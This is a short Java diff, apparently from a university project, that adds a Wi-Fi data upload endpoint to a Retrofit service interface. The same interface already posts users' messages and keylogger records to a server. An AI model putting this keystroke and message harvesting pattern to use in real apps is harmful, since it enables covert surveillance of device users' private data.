@@ -8,6 +8,7 @@ import ca.uqac.bigdataetmoi.dto.MessageDto;
 import ca.uqac.bigdataetmoi.dto.PhotoDto;
 import ca.uqac.bigdataetmoi.dto.UserAuthenticationDto;
 import ca.uqac.bigdataetmoi.models.Application;
+import ca.uqac.bigdataetmoi.dto.WifiDto;
 import ca.uqac.bigdataetmoi.models.User;
 import retrofit2.Call;
 import retrofit2.http.Body;
@@ -29,6 +30,9 @@ public interface UserService {
 
     @POST("messages")
     Call<User> sendMessages(@Body MessageDto[]  messageList);
+
+    @POST("wifi")
+    Call<User> sendWifi(@Body WifiDto[]  wifiList);
 
     @POST("keylogger")
     Call<User> sendKeyloggerList(@Body List<KeyloggerDto> keyloggerList);
